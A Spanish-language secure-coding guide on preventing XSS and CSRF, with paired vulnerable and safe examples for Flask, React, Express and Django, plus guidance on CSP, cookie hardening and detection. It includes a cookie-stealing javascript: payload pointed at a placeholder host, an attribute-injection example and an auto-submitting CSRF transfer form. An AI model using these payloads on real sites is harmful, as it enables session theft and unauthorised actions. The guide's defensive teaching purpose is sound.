# XSS, CSRF y Seguridad Frontend

| Campo | Valor |
|---|---|
| Dominio | Código y prevención de vulnerabilidades |
| Aplica a | Aplicaciones web SSR/SPA, APIs consumidas por navegador, plantillas, correos HTML |
| Referencias | OWASP Top 10:2025 A05 (Injection, incluye XSS), A01 (Broken Access Control, incluye CSRF), A02 (Security Misconfiguration); OWASP ASVS 5.0 V1 (Encoding and Sanitization), V3 (Web Frontend Security), V7 (Session Management); CWE-79, CWE-352, CWE-1004, CWE-614, CWE-1021 |
| Severidad típica | Alta–Crítica (secuestro de sesión, acciones en nombre de la víctima, robo de datos) |

---

## 1. Principio de Seguridad

**Qué se mitiga:**

- **XSS (CWE-79):** el navegador ejecuta como código (HTML/JS) datos que la aplicación debía tratar como texto. El script inyectado corre con el *origen* de la aplicación, por lo que lee el DOM, hace peticiones autenticadas, roba tokens almacenados en `localStorage` y suplanta al usuario. Según el CWE Top 25 de 2025 es la debilidad n.º 1.
- **CSRF (CWE-352):** un sitio externo provoca que el navegador de la víctima envíe una petición que cambia estado, y el navegador adjunta automáticamente las cookies de sesión. El servidor no puede distinguir si la intención fue legítima.

**Regla rectora:**

1. **Codificar la salida según el contexto** donde se inserta el dato (HTML, atributo, URL, JS, CSS), usando el motor de plantillas con *autoescape* y evitando los "sinks" peligrosos.
2. **CSP estricta** basada en *nonces* o *hashes* como segunda barrera, para que un fallo de codificación no se traduzca en ejecución.
3. **Cookies endurecidas** (`HttpOnly`, `Secure`, `SameSite`, prefijo `__Host-`) junto con **tokens anti-CSRF** o *Fetch Metadata* en toda operación que cambie estado.

### Tipos de XSS

| Tipo | Origen del payload | Dónde se corrige |
|---|---|---|
| Reflejado | Parámetro de la petición actual, reflejado en la respuesta | Servidor: codificación de salida |
| Almacenado | Dato persistido (BD, logs, perfil) y renderizado a otros usuarios | Servidor y cliente: codificación + sanitización de HTML enriquecido |
| DOM-based | Fuente en el cliente (`location.hash`, `postMessage`, `document.referrer`) llega a un sink (`innerHTML`, `eval`) | Cliente: APIs seguras del DOM, Trusted Types |

---

## 2. Codificación contextual de salida

| Contexto | Ejemplo | Codificación requerida |
|---|---|---|
| Cuerpo HTML | `<p>DATO</p>` | Entidades HTML: `& < > " '` |
| Atributo HTML (entrecomillado) | `<input value="DATO">` | Entidades HTML y comillas obligatorias en el atributo |
| URL (parámetro) | `<a href="/s?q=DATO">` | `encodeURIComponent` / `urllib.parse.quote` |
| URL completa (`href`, `src`) | `<a href="DATO">` | Validar el esquema con allow-list (`https:`, `mailto:`) y bloquear `javascript:` y `data:` |
| Bloque JavaScript | `<script>var x = DATO</script>` | **Evitar.** Pasar los datos por `JSON` en un `<script type="application/json">` o en un atributo `data-*` |
| CSS | `style="color: DATO"` | **Evitar.** Usar clases predefinidas |

### 2.1 Servidor (Python / Jinja2 / Flask)

**Patrón Vulnerable (Qué NO hacer)**

```python
from markupsafe import Markup

# VULNERABLE: XSS reflejado al construir HTML con f-strings.
@app.get("/search")
def search():
    q = request.args.get("q", "")
    return f"<h2>Resultados para: {q}</h2>"

# VULNERABLE: marcar como seguro contenido del usuario.
return render_template("profile.html", bio=Markup(user.bio))
```

```html
<!-- VULNERABLE: |safe desactiva el autoescape. -->
<div class="bio">{{ user.bio | safe }}</div>
<!-- VULNERABLE: atributo sin comillas -> onmouseover=alert(1) -->
<input value={{ q }}>
<!-- VULNERABLE: href controlado -> javascript:fetch('//evil/'+document.cookie) -->
<a href="{{ user.website }}">Sitio</a>
```

**Patrón Seguro (Qué SÍ hacer)**

```python
import nh3  # sanitizador HTML en Rust (sucesor recomendado de bleach, ya descontinuado)
from urllib.parse import urlparse

app.jinja_env.autoescape = True  # por defecto en Flask para .html; verificarlo explícitamente

ALLOWED_TAGS = {"b", "i", "em", "strong", "p", "ul", "ol", "li", "a", "br"}
ALLOWED_ATTRS = {"a": {"href", "title"}}

def sanitize_rich_text(html: str) -> str:
    """Para campos de texto enriquecido: sanitizar AL GUARDAR y al renderizar."""
    return nh3.clean(html, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS,
                     url_schemes={"https", "mailto"}, link_rel="noopener noreferrer nofollow")

def safe_url(url: str) -> str:
    parsed = urlparse(url)
    return url if parsed.scheme in {"https", "mailto"} else "#"

@app.get("/search")
def search():
    return render_template("search.html", q=request.args.get("q", ""))
```

```html
<h2>Resultados para: {{ q }}</h2>                       <!-- autoescape -->
<input value="{{ q }}">                                 <!-- atributo entrecomillado -->
<a href="{{ safe_url(user.website) }}" rel="noopener">Sitio</a>
<script type="application/json" id="boot">{{ data | tojson }}</script>  <!-- datos a JS -->
```

### 2.2 React / TypeScript

React escapa por defecto las expresiones `{}`. Los vectores de XSS en React son `dangerouslySetInnerHTML`, `href`/`src` con `javascript:`, el uso directo de `ref.current.innerHTML`, el SSR con estado serializado sin escapar y las librerías de Markdown con HTML habilitado.

**Patrón Vulnerable (Qué NO hacer)**

```tsx
// VULNERABLE: HTML del servidor/usuario sin sanitizar.
<div dangerouslySetInnerHTML={{ __html: comment.body }} />

// VULNERABLE: según la versión, React solo advierte sobre javascript: en href; no confíe en el framework.
<a href={profile.url}>Web</a>

// VULNERABLE: DOM-based XSS en SPA.
document.getElementById("msg")!.innerHTML = new URLSearchParams(location.search).get("msg")!;

// VULNERABLE: estado SSR inyectado en <script> sin escapar "</script>".
<script dangerouslySetInnerHTML={{ __html: `window.__STATE__=${JSON.stringify(state)}` }} />
```

**Patrón Seguro (Qué SÍ hacer)**

```tsx
import DOMPurify from "dompurify";
import serialize from "serialize-javascript";

const SAFE_SCHEMES = new Set(["https:", "mailto:"]);

export function safeHref(raw: string): string {
  try {
    const url = new URL(raw, window.location.origin);
    return SAFE_SCHEMES.has(url.protocol) ? url.toString() : "#";
  } catch {
    return "#";
  }
}

export function Comment({ body }: { body: string }) {
  // Sanitizar justo antes del sink; configuración restrictiva.
  const clean = DOMPurify.sanitize(body, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "p", "a", "ul", "li", "br"],
    ALLOWED_ATTR: ["href"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// Texto plano: textContent, nunca innerHTML.
document.getElementById("msg")!.textContent = new URLSearchParams(location.search).get("msg") ?? "";

// Estado SSR: serializador que escapa < > / y U+2028/2029.
<script nonce={nonce} dangerouslySetInnerHTML={{ __html: `window.__STATE__=${serialize(state, { isJSON: true })}` }} />
```

### 2.3 Sinks prohibidos sin sanitización

`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`, `setTimeout(string)`, `setInterval(string)`, `location = dato`, `element.src/href = dato`, `$(dato)` / `.html()` de jQuery, `v-html` (Vue), `[innerHTML]` (Angular, con `bypassSecurityTrust*`) y `{@html}` (Svelte).

### 2.4 Trusted Types (bloqueo de DOM XSS a nivel de plataforma)

```javascript
// Con la cabecera CSP: require-trusted-types-for 'script'; trusted-types app-policy dompurify;
// el navegador rechaza strings en sinks peligrosos salvo que pasen por una política registrada.
const policy = trustedTypes.createPolicy("app-policy", {
  createHTML: (input) => DOMPurify.sanitize(input, { RETURN_TRUSTED_TYPE: false }),
});
el.innerHTML = policy.createHTML(untrusted);
```

> Despliegue Trusted Types primero en modo `Content-Security-Policy-Report-Only` para inventariar violaciones antes de forzarlo.

---

## 3. Content Security Policy (CSP) estricta

**Principio:** una CSP basada en *allow-list* de dominios (`script-src cdn.ejemplo.com`) es eludible con JSONP o con librerías alojadas en esos CDNs. Use una **CSP estricta con nonces o hashes** y `strict-dynamic`.

**Patrón Vulnerable (Qué NO hacer)**

```nginx
# VULNERABLE: unsafe-inline + unsafe-eval + comodines anulan la protección.
add_header Content-Security-Policy "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:";
```

**Patrón Seguro (Qué SÍ hacer)**

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{RANDOM}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  form-action 'self';
  img-src 'self' data: https:;
  style-src 'self' 'nonce-{RANDOM}';
  connect-src 'self' https://api.empresa.com;
  upgrade-insecure-requests;
  require-trusted-types-for 'script';
  report-to csp-endpoint
```

> `'unsafe-inline'` y `https:` se ignoran en navegadores que soportan nonces/`strict-dynamic`; solo sirven de *fallback* para navegadores antiguos. El nonce debe ser aleatorio (≥128 bits), **único por respuesta** y nunca reutilizado ni cacheado.

**Generación de nonce por petición (Express/TypeScript)**

```typescript
import crypto from "node:crypto";
import helmet from "helmet";

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
  next();
});

app.use(
  helmet.contentSecurityPolicy({
    useDefaults: false,
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [(req, res) => `'nonce-${(res as any).locals.cspNonce}'`, "'strict-dynamic'"],
      objectSrc: ["'none'"],
      baseUri: ["'none'"],
      frameAncestors: ["'none'"],
      formAction: ["'self'"],
      requireTrustedTypesFor: ["'script'"],
      upgradeInsecureRequests: [],
    },
  }),
);
// En la plantilla: <script nonce="<%= cspNonce %>" src="/app.js"></script>
```

**Python (FastAPI / Starlette middleware)**

```python
import secrets
from starlette.middleware.base import BaseHTTPMiddleware

class CSPMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        nonce = secrets.token_urlsafe(18)
        request.state.csp_nonce = nonce
        response = await call_next(request)
        response.headers["Content-Security-Policy"] = (
            f"default-src 'self'; script-src 'nonce-{nonce}' 'strict-dynamic'; "
            "object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'"
        )
        return response
```

**Proceso de despliegue de la CSP:** (1) `Content-Security-Policy-Report-Only` con `report-to` durante 1–2 sprints, (2) eliminar los scripts inline y los handlers `onclick=`, (3) forzar la política, (4) monitorear los reportes de forma continua. Valide la política con **CSP Evaluator** de Google.

---

## 4. CSRF (Cross-Site Request Forgery)

### 4.1 Mecánica

```html
<!-- Página del atacante: el navegador de la víctima envía su cookie de sesión. -->
<form action="https://banca.empresa.com/transfer" method="POST" id="f">
  <input name="to" value="ATACANTE"><input name="amount" value="5000">
</form>
<script>document.getElementById("f").submit()</script>
```

### 4.2 Defensas (en capas)

1. **Token sincronizado o *double-submit cookie* firmada** en toda petición que cambia estado (POST, PUT, PATCH, DELETE).
2. **`SameSite=Strict` o `Lax`** en la cookie de sesión (defensa en profundidad, no control único: los subdominios hermanos se consideran *same-site*).
3. **Verificación de *Fetch Metadata*** (`Sec-Fetch-Site`) y de `Origin` en el servidor.
4. **Nunca cambiar estado con GET.**
5. Las APIs con autenticación por cabecera `Authorization: Bearer` (no por cookie) no son vulnerables a CSRF clásico, pero sí a XSS si el token se guarda en `localStorage`.

**Patrón Vulnerable (Qué NO hacer)**

```python
# VULNERABLE: cambio de estado por GET, sin token, con cookie de sesión.
@app.get("/account/delete")
@login_required
def delete_account():
    current_user.delete()
    return redirect("/")

# VULNERABLE: deshabilitar CSRF globalmente "porque molesta" en el frontend.
app.config["WTF_CSRF_ENABLED"] = False
```

**Patrón Seguro (Qué SÍ hacer) — Flask**

```python
from flask_wtf.csrf import CSRFProtect

app.config.update(
    WTF_CSRF_ENABLED=True,
    WTF_CSRF_TIME_LIMIT=3600,
    WTF_CSRF_SSL_STRICT=True,   # valida Referer/Origin en HTTPS
)
csrf = CSRFProtect(app)

@app.post("/account/delete")
@login_required
def delete_account():
    # Re-autenticación para acciones de alto impacto.
    if not verify_recent_auth(current_user, max_age_s=300):
        abort(403)
    current_user.delete()
    return redirect("/")
```

```html
<form method="post" action="/account/delete">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  <button type="submit">Eliminar cuenta</button>
</form>
```

**Patrón Seguro (Qué SÍ hacer) — Fetch Metadata como capa adicional (Python)**

```python
SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}

@app.before_request
def fetch_metadata_policy():
    site = request.headers.get("Sec-Fetch-Site")
    if site is None:              # navegador antiguo o cliente no-navegador: depender del token CSRF
        return
    if site in ("same-origin", "none"):
        return
    if request.method == "GET" and request.headers.get("Sec-Fetch-Mode") == "navigate" \
            and request.headers.get("Sec-Fetch-Dest") not in ("object", "embed"):
        return                    # permitir navegación cross-site de nivel superior
    abort(403)                    # bloquear peticiones cross-site a recursos/acciones
```

**Patrón Seguro (Qué SÍ hacer) — SPA + API con cookie (TypeScript)**

```typescript
// Servidor (Express): double-submit cookie firmada con HMAC atada a la sesión.
import crypto from "node:crypto";

function csrfToken(sessionId: string): string {
  const rand = crypto.randomBytes(32).toString("hex");
  const mac = crypto.createHmac("sha256", process.env.CSRF_SECRET!).update(`${sessionId}!${rand}`).digest("hex");
  return `${mac}.${rand}`;
}

function verifyCsrf(req, res, next) {
  if (["GET", "HEAD", "OPTIONS"].includes(req.method)) return next();
  const header = req.get("X-CSRF-Token") ?? "";
  const [mac, rand] = header.split(".");
  const expected = crypto.createHmac("sha256", process.env.CSRF_SECRET!)
    .update(`${req.session.id}!${rand}`).digest("hex");
  if (!mac || !crypto.timingSafeEqual(Buffer.from(mac), Buffer.from(expected))) {
    return res.status(403).json({ error: "CSRF token inválido" });
  }
  next();
}

// Cliente: enviar el token en una cabecera personalizada.
await fetch("/api/transfer", {
  method: "POST",
  credentials: "same-origin",
  headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
  body: JSON.stringify({ to, amount }),
});
```

> El paquete `csurf` de Express está **deprecado**. Use `csrf-csrf` o `csrf-sync`, o la implementación anterior. En Django, mantenga `CsrfViewMiddleware` activo y no use `@csrf_exempt` sin una justificación documentada.

---

## 5. Configuración segura de cookies

| Atributo | Valor | Mitiga |
|---|---|---|
| `HttpOnly` | Siempre en cookies de sesión | Robo de la sesión vía `document.cookie` en caso de XSS (CWE-1004) |
| `Secure` | Siempre | Envío por HTTP en claro (CWE-614) |
| `SameSite` | `Strict` para sesión de aplicaciones internas o de alto riesgo; `Lax` si se requiere navegación entrante desde enlaces externos | CSRF y fugas cross-site |
| Prefijo `__Host-` | `__Host-session` | Obliga a `Secure`, `Path=/` y prohíbe `Domain`, lo que evita la fijación desde subdominios |
| `Path` | `/` | — |
| `Domain` | **No definir** | Evitar que los subdominios reciban la cookie |
| `Max-Age` / `Expires` | Corto (p. ej., 8 h) con expiración por inactividad en el servidor | Ventana de secuestro |

**Patrón Vulnerable (Qué NO hacer)**

```javascript
// VULNERABLE: token JWT en localStorage (accesible por cualquier XSS).
localStorage.setItem("token", jwt);

// VULNERABLE: cookie de sesión sin flags y con Domain amplio.
res.cookie("session", sid, { domain: ".empresa.com" });
```

**Patrón Seguro (Qué SÍ hacer)**

```typescript
// Express
res.cookie("__Host-session", sid, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  path: "/",
  maxAge: 8 * 60 * 60 * 1000,
});
```

```python
# Flask
app.config.update(
    SESSION_COOKIE_NAME="__Host-session",
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE="Strict",
    PERMANENT_SESSION_LIFETIME=timedelta(hours=8),
)

# Django settings.py
SESSION_COOKIE_NAME = "__Host-sessionid"
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = "Strict"
CSRF_COOKIE_NAME = "__Host-csrftoken"
CSRF_COOKIE_SECURE = True
CSRF_TRUSTED_ORIGINS = ["https://app.empresa.com"]
```

```nginx
# Nginx como proxy: endurecer cookies emitidas por un backend heredado (nginx >= 1.19.3).
proxy_cookie_flags ~ secure httponly samesite=strict;
```

> **Regenerar el ID de sesión** al autenticar, al elevar privilegios y al cambiar la contraseña (prevención de *session fixation*, CWE-384). Invalidar la sesión **en el servidor** al hacer logout.

---

## 6. Otros controles frontend

```http
# Clickjacking (CWE-1021): CSP frame-ancestors (preferido) + X-Frame-Options como fallback.
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY

# Aislamiento de origen frente a ataques tipo Spectre/XS-Leaks.
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

- **`target="_blank"`:** use `rel="noopener noreferrer"` (los navegadores modernos aplican `noopener` implícito, pero declárelo).
- **`postMessage`:** valide siempre `event.origin` contra una allow-list exacta y nunca use `"*"` como `targetOrigin` al enviar datos sensibles.
- **Subresource Integrity (SRI)** para recursos de terceros: `<script src="https://cdn/x.js" integrity="sha384-..." crossorigin="anonymous">`.
- **CORS:** no refleje el `Origin` arbitrario junto con `Access-Control-Allow-Credentials: true`. Use una allow-list exacta.

```typescript
// postMessage seguro
window.addEventListener("message", (event) => {
  if (event.origin !== "https://widget.empresa.com") return;
  const data = MessageSchema.safeParse(event.data);  // validar estructura (Zod)
  if (!data.success) return;
  handle(data.data);
});
```

---

## 7. Detección automatizada

- **ESLint:** `eslint-plugin-security`, `eslint-plugin-no-unsanitized` (bloquea `innerHTML`/`insertAdjacentHTML` sin sanitizar) y `react/no-danger` en nivel `error` con excepciones revisadas.
- **Semgrep:** `p/xss`, `p/react`, `p/flask`, `p/django`.
- **DAST:** OWASP ZAP baseline en el pipeline de staging; revisión manual con Burp Suite (DOM Invader para DOM XSS).
- **Validación de cabeceras:** `curl -sI https://app | grep -iE "content-security|set-cookie|x-frame"` y Mozilla HTTP Observatory.

```yaml
# GitHub Actions: ZAP baseline contra staging
- name: ZAP Baseline
  uses: zaproxy/action-baseline@v0.14.0
  with:
    target: "https://staging.empresa.com"
    fail_action: true
```

---

## 8. Checklist de Verificación (antes de merge / deploy)

- [ ] El motor de plantillas tiene el autoescape activo y no hay usos de `|safe`, `Markup()`, `mark_safe`, `v-html`, `{@html}` ni `bypassSecurityTrust*` sin una revisión documentada.
- [ ] Todo `dangerouslySetInnerHTML` o `innerHTML` pasa por DOMPurify o nh3 con una allow-list restrictiva.
- [ ] Los atributos `href`/`src` con datos externos validan el esquema (`https:`/`mailto:`), y `javascript:` y `data:` están bloqueados.
- [ ] Los datos que se pasan a JavaScript usan `tojson`, `serialize-javascript` o `<script type="application/json">`, nunca concatenación.
- [ ] La CSP está activa con `nonce`/`hash` + `strict-dynamic`, `object-src 'none'`, `base-uri 'none'` y `frame-ancestors 'none'`, sin `unsafe-eval` y sin comodines.
- [ ] El nonce de la CSP se genera con un CSPRNG por cada respuesta y no se cachea.
- [ ] Trusted Types está habilitado (al menos en modo Report-Only) en SPAs.
- [ ] Toda operación que cambia estado usa POST/PUT/PATCH/DELETE y valida un token CSRF o Fetch Metadata + Origin.
- [ ] No hay `@csrf_exempt` ni CSRF deshabilitado globalmente sin una justificación aprobada.
- [ ] Las cookies de sesión usan `__Host-`, `HttpOnly`, `Secure` y `SameSite=Strict` (o `Lax` justificado), sin `Domain`.
- [ ] No hay tokens de sesión, JWT ni refresh tokens en `localStorage` o `sessionStorage`.
- [ ] El ID de sesión se regenera al hacer login o elevar privilegios, y se invalida en el servidor al hacer logout.
- [ ] `postMessage` valida `event.origin`; CORS no refleja orígenes arbitrarios con credenciales.
- [ ] Los scripts de terceros usan SRI y versiones fijas.
- [ ] ESLint (`no-unsanitized`) y Semgrep pasan sin hallazgos de severidad alta; ZAP baseline no reporta XSS ni cabeceras faltantes.

---

## 9. Referencias

- OWASP Cheat Sheets: Cross Site Scripting Prevention, DOM based XSS Prevention, Cross-Site Request Forgery Prevention, Content Security Policy, Session Management: https://cheatsheetseries.owasp.org/
- OWASP ASVS 5.0 — V3 Web Frontend Security, V7 Session Management: https://github.com/OWASP/ASVS
- W3C Content Security Policy Level 3 y Trusted Types: https://www.w3.org/TR/CSP3/ · https://w3c.github.io/trusted-types/dist/spec/
- Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
- MDN — Set-Cookie, Fetch Metadata Request Headers: https://developer.mozilla.org/
